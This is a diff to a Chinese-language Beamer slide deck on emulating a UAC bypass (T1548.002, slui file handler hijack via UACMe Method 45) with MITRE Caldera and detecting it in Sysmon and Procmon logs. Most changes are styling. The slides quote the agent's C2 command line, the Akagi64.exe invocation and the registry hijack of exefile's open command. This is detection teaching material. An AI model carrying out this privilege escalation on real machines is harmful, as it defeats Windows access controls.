@@ -1,7 +1,7 @@
 \documentclass[12pt,aspectratio=169]{beamer}
 
 \usetheme{Madrid}
-\usecolortheme{seahorse}
+\usecolortheme{whale}
 \useinnertheme{rectangles}
 \setbeamertemplate{navigation symbols}{}
 \usepackage{fontspec}
@@ -18,20 +18,49 @@
 \usepackage{listings}
 \usepackage{xcolor}
 
-\definecolor{codebg}{RGB}{40,42,54}
+% Custom palette: deep navy header, clean body contrast
+\definecolor{navydark}{RGB}{13,38,75}
+\definecolor{navymid}{RGB}{25,65,120}
+\definecolor{navylight}{RGB}{200,215,240}
+\setbeamercolor{palette primary}{bg=navydark,fg=white}
+\setbeamercolor{palette secondary}{bg=navymid,fg=white}
+\setbeamercolor{palette tertiary}{bg=navylight,fg=navydark}
+\setbeamercolor{frametitle}{bg=navydark,fg=white}
+\setbeamercolor{title}{fg=white}
+\setbeamercolor{subtitle}{fg=navylight}
+\setbeamercolor{normal text}{fg=black!90,bg=white}
+\setbeamercolor{item}{fg=navymid}
+\setbeamercolor{subitem}{fg=navymid!70}
+
+% Block colors
+\setbeamercolor{block title}{bg=navymid,fg=white}
+\setbeamercolor{block body}{bg=navylight!40,fg=black!90}
+\setbeamercolor{block title alerted}{bg=red!65!black,fg=white}
+\setbeamercolor{block body alerted}{bg=red!8,fg=black!90}
+\setbeamercolor{block title example}{bg=teal!60!black,fg=white}
+\setbeamercolor{block body example}{bg=teal!8,fg=black!90}
+
+% Code block colors (Dracula-inspired, high contrast)
+\definecolor{codebg}{RGB}{30,32,43}
 \definecolor{codefg}{RGB}{248,248,242}
 \definecolor{codekey}{RGB}{255,121,198}
 \definecolor{codestr}{RGB}{241,250,140}
+\definecolor{codecomment}{RGB}{98,114,164}
 
 \lstdefinestyle{dark}{
   backgroundcolor=\color{codebg},
-  basicstyle=\ttfamily\footnotesize\color{codefg},
-  keywordstyle=\color{codekey},
+  basicstyle=\ttfamily\small\color{codefg},
+  keywordstyle=\color{codekey}\bfseries,
   stringstyle=\color{codestr},
+  commentstyle=\color{codecomment}\itshape,
   breaklines=true,
   showstringspaces=false,
-  frame=none,
+  frame=single,
+  rulecolor=\color{navymid},
+  framerule=1pt,
   columns=fullflexible,
+  xleftmargin=4pt,
+  xrightmargin=4pt,
 }
 \setbeamerfont{frametitle}{size=\Large,series=\bfseries}
 \setbeamerfont{title}{size=\LARGE,series=\bfseries}
@@ -66,7 +95,6 @@
 \title{MITRE Caldera 攻擊模擬與日誌分析}
 \subtitle{T1548.002 - Slui File Handler Hijack}
 \author{趙子佾, 吳秉哲}
-\institute{NTU Seminar}
 
 \begin{document}
 
@@ -160,111 +188,195 @@ cmd.exe 由「已是 High」的 slui.exe 啟動，因此一出生就是 High。\
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{Sysmon 日誌分析 - 攻擊鏈還原}
+\begin{frame}[fragile]{Sysmon 日誌分析 - Stage 1: Agent 啟動 (01:09:44)}
 \begin{columns}[T]
-\begin{column}{0.68\textwidth}
-從 Sysmon Event ID 1 (Process Create) 還原完整攻擊鏈：
+\begin{column}{0.65\textwidth}
 \begin{table}
 \centering
 \scriptsize
-\begin{tabular}{@{}llll@{}}
+\begin{tabular}{@{}lll@{}}
 \toprule
-時間 & Process & IntegrityLevel & Parent \\
+時間 & Process (PID) & IntegrityLevel \\
 \midrule
-12:27:53 & powershell.exe  & Medium & splunkd.exe \\
-12:27:54 & Akagi64.exe     & Medium & powershell.exe \\
-12:27:54 & slui.exe        & \textbf{High} & Akagi64.exe \\
-12:27:54 & slui.exe 0x03   & \textbf{High} & slui.exe \\
-12:27:54 & cmd.exe         & \textbf{High} & slui.exe \\
-12:27:59 & Akagi64.exe     & - & Event ID 5 (終止) \\
+01:09:44 & splunkd.exe (4008)  & Medium \\
+01:09:44 & powershell.exe (5552)  & Medium \\
 \bottomrule
 \end{tabular}
 \end{table}
 
-\vspace{0.5em}
-\footnotesize
-\textbf{重點}：IntegrityLevel 從 \textcolor{red!70!black}{\textbf{Medium} $\rightarrow$ \textbf{High}} 代表 UAC Bypass 成功
+\vspace{0.3em}
+\textbf{\footnotesize 攻擊啟動：}
+\begin{lstlisting}[style=dark,basicstyle=\scriptsize\ttfamily\color{codefg}]
+Image: C:\Users\Public\splunkd.exe
+Server: http://10.1.106.114:8888
+-group red
+\end{lstlisting}
+
+\vspace{0.2em}
+\textbf{\footnotesize PowerShell 執行：}
+\begin{lstlisting}[style=dark,basicstyle=\scriptsize\ttfamily\color{codefg}]
+Image: powershell.exe (5552)
+CommandLine: -ExecutionPolicy Bypass
+  -C "./Akagi64.exe 45 ..."
+\end{lstlisting}
 \end{column}
-\begin{column}{0.32\textwidth}
+\begin{column}{0.35\textwidth}
 \centering
-\minichain{mcbox}{mchl}{mchl}{mchl}{mchl}{mchl}
+\minichain{mchl}{mchl}{mcbox}{mcbox}{mcbox}{mcbox}
 \end{column}
 \end{columns}
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Sysmon 日誌分析 }
+\begin{frame}[fragile]{Sysmon 日誌分析 - Stage 2: UAC Bypass (01:09:44)}
 \begin{columns}[T]
-\begin{column}{0.68\textwidth}
-\textbf{\footnotesize 攻擊來源 (Agent 偽裝為 Splunk)：}
-\begin{lstlisting}
-Image: C:\Users\Public\splunkd.exe
-CommandLine: splunkd.exe -server
-             http://10.1.106.114:8888 -group red
-User: caldera-agent\caldera
-\end{lstlisting}
+\begin{column}{0.65\textwidth}
+\begin{table}
+\centering
+\scriptsize
+\begin{tabular}{@{}lll@{}}
+\toprule
+時間 & Process (PID) & IntegrityLevel \\
+\midrule
+01:09:44 & powershell.exe (5552) & Medium \\
+01:09:44 & Akagi64.exe (11604) & Medium \\
+\bottomrule
+\end{tabular}
+\end{table}
 
-\textbf{\footnotesize UAC Bypass 執行：}
-\begin{lstlisting}
-Image: C:\Users\Public\Akagi64.exe
+\vspace{0.3em}
+\textbf{\footnotesize UAC Bypass 工具啟動 (Method 45)：}
+\begin{lstlisting}[style=dark,basicstyle=\scriptsize\ttfamily\color{codefg}]
+Image: Akagi64.exe
+ProcessId: 11604
 CommandLine: Akagi64.exe 45
-             C:\Windows\System32\cmd.exe
+  C:\Windows\System32\cmd.exe
 Description: UACMe main module
-Product: UACMe
+FileVersion: 3.2.2.1911
 IntegrityLevel: Medium
 \end{lstlisting}
 \end{column}
-\begin{column}{0.32\textwidth}
+\begin{column}{0.35\textwidth}
 \centering
-\minichain{mcbox}{mchl}{mcbox}{mchl}{mcbox}{mcbox}
+\minichain{mcbox}{mchl}{mchl}{mcbox}{mcbox}{mcbox}
 \end{column}
 \end{columns}
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}[fragile]{Sysmon 日誌分析 }
+\begin{frame}[fragile]{Sysmon 日誌分析 - Stage 3: Registry Hijack (01:09:45)}
 \begin{columns}[T]
-\begin{column}{0.68\textwidth}
-\textbf{\footnotesize 最終結果 (High Integrity Shell)：}
-\begin{lstlisting}
-Image: C:\Windows\System32\cmd.exe
-ParentImage: C:\Windows\System32\slui.exe
-ParentCommandLine:
-   "C:\WINDOWS\system32\slui.exe" 0x03
-IntegrityLevel: High
-User: caldera-agent\caldera
-\end{lstlisting}
+\begin{column}{0.65\textwidth}
+\begin{table}
+\centering
+\scriptsize
+\begin{tabular}{@{}lll@{}}
+\toprule
+時間 & Process (PID) & IntegrityLevel \\
+\midrule
+01:09:44 & Akagi64.exe (11604) & Medium \\
+01:09:45 & slui.exe (3272) & \textbf{High} \\
+01:09:45 & slui.exe 0x03 (3436) & \textbf{High} \\
+\bottomrule
+\end{tabular}
+\end{table}
 
-\begin{alertblock}{\footnotesize 偵測要點}
-\footnotesize
-\begin{itemize}
-  \item \texttt{slui.exe} 通常不應作為 \texttt{cmd.exe} 的父行程
-  \item \texttt{splunkd.exe} 位於 \texttt{C:\textbackslash Users\textbackslash Public\textbackslash} 為異常路徑
-  \item 父子鏈 \texttt{splunkd.exe $\rightarrow$ powershell.exe $\rightarrow$ Akagi64.exe} 為高度可疑
-\end{itemize}
-\end{alertblock}
+\vspace{0.3em}
+\textbf{\footnotesize slui.exe 連鎖啟動（Registry Hijack）：}
+\begin{lstlisting}[style=dark,basicstyle=\scriptsize\ttfamily\color{codefg}]
+Image: slui.exe (PID 3272)
+CommandLine: slui.exe
+ParentImage: Akagi64.exe (11604)
+IntegrityLevel: High ← Auto-elevated!
+
+→ slui.exe (PID 3436) 0x03
+CommandLine: slui.exe 0x03
+IntegrityLevel: High
+\end{lstlisting}
 \end{column}
-\begin{column}{0.32\textwidth}
+\begin{column}{0.35\textwidth}
+\centering
+\minichain{mcbox}{mcbox}{mcbox}{mchl}{mchl}{mcbox}
+\end{column}
+\end{columns}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Sysmon 日誌分析 - Stage 4: 權限繼承 (01:09:46)}
+\begin{columns}[T]
+\begin{column}{0.65\textwidth}
+\begin{table}
+\centering
+\scriptsize
+\begin{tabular}{@{}lll@{}}
+\toprule
+時間 & Process (PID) & IntegrityLevel \\
+\midrule
+01:09:45 & slui.exe 0x03 (3436) & \textbf{High} \\
+01:09:46 & cmd.exe (4084) & \textbf{High} \\
+01:09:50 & Akagi64.exe & 終止 \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\vspace{0.3em}
+\textbf{\footnotesize 最終結果：High Integrity Shell}
+\begin{lstlisting}[style=dark,basicstyle=\scriptsize\ttfamily\color{codefg}]
+Image: cmd.exe
+ProcessId: 4084
+ParentProcessId: 3436
+ParentImage: slui.exe
+IntegrityLevel: High [SUCCESS!]
+Description: Windows Command Processor
+FileVersion: 10.0.26100.8115
+MD5: 77F0062F490BCC702...
+\end{lstlisting}
+\end{column}
+\begin{column}{0.35\textwidth}
 \centering
 \minichain{mcbox}{mcbox}{mcbox}{mcbox}{mchl}{mchl}
 \end{column}
 \end{columns}
 \end{frame}
 
+
+% ------------------------------------------------------------
+% \begin{frame}[fragile]{Sysmon 日誌分析 - 關鍵偵測點}
+% \begin{alertblock}{\large 攻擊特徵（IOC）}
+% \footnotesize
+% \begin{itemize}
+%   \item \textbf{異常進程路徑}：\texttt{splunkd.exe}、\texttt{Akagi64.exe} 位於 \texttt{C:\textbackslash Users\textbackslash Public\textbackslash}
+%   \item \textbf{可疑父子關係}：
+%   \begin{itemize}
+%     \item \texttt{splunkd.exe} → \texttt{powershell.exe} → \texttt{Akagi64.exe}（連續提升權限工具）
+%     \item \texttt{slui.exe} 作為 \texttt{cmd.exe} 的父行程（異常）
+%   \end{itemize}
+%   \item \textbf{完整性級別提升}：Medium → \textbf{High}（UAC Bypass 成功跡象）
+%   \item \textbf{時間關聯性}：1秒內完成整個 UAC Bypass 鏈（自動化攻擊）
+%   \item \textbf{工具指紋}：UACMe (Akagi64.exe, FileVersion 3.2.2.1911)
+%   \item \textbf{Hash 值}（偵測指標）：
+%   \begin{itemize}
+%     \item Akagi64.exe MD5: \texttt{CA3FE69BFDBD536856BF36BBB8C949D4}
+%     \item cmd.exe MD5: \texttt{77F0062F490BCC7023763A422E561945}
+%   \end{itemize}
+% \end{itemize}
+% \end{alertblock}
+% \end{frame}
+
 % ------------------------------------------------------------
 \begin{frame}[fragile]{Procmon 輔助分析 - Registry Hijack}
 Procmon 補充 Sysmon 所看不到的 Registry 操作，揭露 Method 45 核心手法：
-\begin{lstlisting}
+\begin{lstlisting}[style=dark,basicstyle=\scriptsize\ttfamily\color{codefg}]
 01:09:44.952  Akagi64.exe  RegCreateKey
-   HKCU\Software\Classes\exefile\shell\open\command
-   Disposition: REG_OPENED_EXISTING_KEY
+   HKCU/Software/Classes/exefile/shell/open/command
 
 01:09:44.953  Akagi64.exe  RegSetValue
-   HKCU\Software\Classes\exefile\shell\open\command\(Default)
-   Type: REG_SZ   Data: C:\Windows\System32\cmd.exe
+   HKCU/Software/Classes/exefile/shell/open/command
+   Type: REG_SZ
+   Data: C:\Windows\System32\cmd.exe
 
 01:09:44.958  Akagi64.exe  QueryDirectory
-   C:\Windows\System32\slui.exe
+   slui.exe
 \end{lstlisting}
 
 \textbf{手法說明}：攻擊者將 \texttt{exefile} 的 shell open command 改寫為 \texttt{cmd.exe}，
@@ -273,15 +385,15 @@ Procmon 補充 Sysmon 所看不到的 Registry 操作，揭露 Method 45 核心�
 \end{frame}
 
 % ------------------------------------------------------------
-\begin{frame}{結論}
-\begin{itemize}
-  \item 成功使用 MITRE Caldera 模擬 \textbf{T1548.002} Slui File Handler Hijack 攻擊
-  \item Sysmon 完整記錄從 Agent 啟動到 UAC Bypass 的完整攻擊鏈
-  \item 攻擊者使用 \texttt{splunkd.exe} 偽裝成合法程式，並透過 \texttt{Akagi64.exe} 執行 Method 45 繞過 UAC
-  \item Procmon 補足 Registry 層級證據：\texttt{HKCU\textbackslash Software\textbackslash Classes\textbackslash exefile\textbackslash shell\textbackslash open\textbackslash command} 被劫持
-  \item \textbf{IntegrityLevel 從 Medium 提升至 High} 是關鍵偵測指標
-\end{itemize}
-\end{frame}
+% \begin{frame}{結論}
+% \begin{itemize}
+%   \item 成功使用 MITRE Caldera 模擬 \textbf{T1548.002} Slui File Handler Hijack 攻擊
+%   \item Sysmon 完整記錄從 Agent 啟動到 UAC Bypass 的完整攻擊鏈
+%   \item 攻擊者使用 \texttt{splunkd.exe} 偽裝成合法程式，並透過 \texttt{Akagi64.exe} 執行 Method 45 繞過 UAC
+%   \item Procmon 補足 Registry 層級證據：\texttt{HKCU\textbackslash Software\textbackslash Classes\textbackslash exefile\textbackslash shell\textbackslash open\textbackslash command} 被劫持
+%   \item \textbf{IntegrityLevel 從 Medium 提升至 High} 是關鍵偵測指標
+% \end{itemize}
+% \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}
